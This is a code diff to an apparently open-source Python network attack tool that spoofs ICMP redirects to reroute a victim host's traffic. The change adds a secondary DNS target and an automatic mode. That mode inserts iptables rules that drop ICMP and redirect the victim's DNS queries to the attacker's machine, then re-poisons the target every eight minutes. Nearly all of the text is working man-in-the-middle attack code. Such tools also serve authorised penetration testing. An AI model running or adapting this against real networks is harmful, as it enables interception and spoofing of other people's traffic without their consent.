@@ -15,10 +15,13 @@
 # 
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-import sys,socket,struct,optparse,random
+import sys,socket,struct,optparse,random,pipes
 from socket import *
 from odict import OrderedDict
 from random import randrange
+from time import sleep
+from subprocess import call
+from pipes import quote
 
 parser = optparse.OptionParser(usage='python %prog -I eth0 -i 10.20.30.40 -g 10.20.30.254 -t 10.20.30.48 -r 10.20.40.1',
                                prog=sys.argv[0],
@@ -30,6 +33,8 @@ parser.add_option('-g', '--gateway',action="store", help="The ip address of the 
 parser.add_option('-t', '--target',action="store", help="The ip address of the target", metavar="10.20.30.48",dest="VictimIP")
 
 parser.add_option('-r', '--route',action="store", help="The ip address of the destination target, example: DNS server. Must be on another subnet.", metavar="10.20.40.1",dest="ToThisHost")
+
+parser.add_option('-s', '--secondaryroute',action="store", help="The ip address of the destination target, example: Secondary DNS server. Must be on another subnet.", metavar="10.20.40.1",dest="ToThisHost2")
 
 parser.add_option('-I', '--interface',action="store", help="Interface name to use, example: eth0", metavar="eth0",dest="Interface")
 
@@ -71,6 +76,7 @@ OriginalGwAddr = options.OriginalGwAddr
 AlternateGwAddr = options.AlternateGwAddr
 VictimIP = options.VictimIP
 ToThisHost = options.ToThisHost
+ToThisHost2 = options.ToThisHost2
 Interface = options.Interface
 
 def Show_Help(ExtraHelpData):
@@ -79,8 +85,6 @@ def Show_Help(ExtraHelpData):
    print help
 
 MoreHelp = "Note that if the target is Windows, the poisoning will only last for 10mn, you can re-poison the target by launching this utility again\nIf you wish to respond to the traffic, for example DNS queries your target issues, launch this command as root:\n\niptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst %s --dport 53 -j DNAT --to-destination %s:53\n\n"%(ToThisHost,OURIP)
-
-Show_Help(MoreHelp)
 
 class Packet():
     fields = OrderedDict([
@@ -218,7 +222,7 @@ def ReceiveArpFrame(DstAddr):
        print "[ARP]%s took too long to Respond. Please provide a valid host.\n"%(DstAddr)
        exit(1)
 
-def IcmpRedirectSock():
+def IcmpRedirectSock(DestinationIP):
     PrintMac,DestMac = ReceiveArpFrame(VictimIP)
     print '[ARP]Target Mac address is :',PrintMac
     PrintMac,RouterMac = ReceiveArpFrame(OriginalGwAddr)
@@ -227,7 +231,7 @@ def IcmpRedirectSock():
     Protocol = 0x0800
     s.bind((Interface, Protocol))
     Eth = Eth2(DstMac=DestMac,SrcMac=RouterMac)
-    IPPackUDP = IPPacket(Cmd="\x11",SrcIP=VictimIP,DestIP=ToThisHost,TTL="\x40",Data=str(DummyUDP()))
+    IPPackUDP = IPPacket(Cmd="\x11",SrcIP=VictimIP,DestIP=DestinationIP,TTL="\x40",Data=str(DummyUDP()))
     IPPackUDP.calculate()
     ICMPPack = ICMPRedir(GwAddr=AlternateGwAddr,Data=str(IPPackUDP))
     ICMPPack.calculate()
@@ -235,6 +239,29 @@ def IcmpRedirectSock():
     IPPack.calculate()
     final = str(Eth)+str(IPPack)
     s.send(final)
-    print '\n[ICMP]%s should have been poisoned with a new route for target: %s.\n'%(VictimIP,ToThisHost)
+    print '\n[ICMP]%s should have been poisoned with a new route for target: %s.\n'%(VictimIP,DestinationIP)
 
-IcmpRedirectSock()
+def FindWhatToDo(ToThisHost2):
+    if ToThisHost2 != None:
+       Show_Help('Hit CRTL-C to kill this script')
+       RunThisInLoop(ToThisHost, ToThisHost2,OURIP)
+    if ToThisHost2 == None:
+       Show_Help(MoreHelp)
+       IcmpRedirectSock(DestinationIP=ToThisHost)
+       exit()
+
+def RunThisInLoop(host, host2, ip):
+    dns1 = pipes.quote(host)
+    dns2 = pipes.quote(host2)
+    ouripadd = pipes.quote(ip)
+    call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns1+" --dport 53 -j DNAT --to-destination "+ouripadd+":53", shell=True)
+    call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns2+" --dport 53 -j DNAT --to-destination "+ouripadd+":53", shell=True)
+    print "[+]Automatic mode enabled\nAn iptable rules has been added for both DNS servers."
+    while True:
+       IcmpRedirectSock(DestinationIP=dns1)
+       IcmpRedirectSock(DestinationIP=dns2)
+       print "[+]Repoisoning the target in 8 minutes..."
+       sleep(480)
+
+FindWhatToDo(ToThisHost2)
+
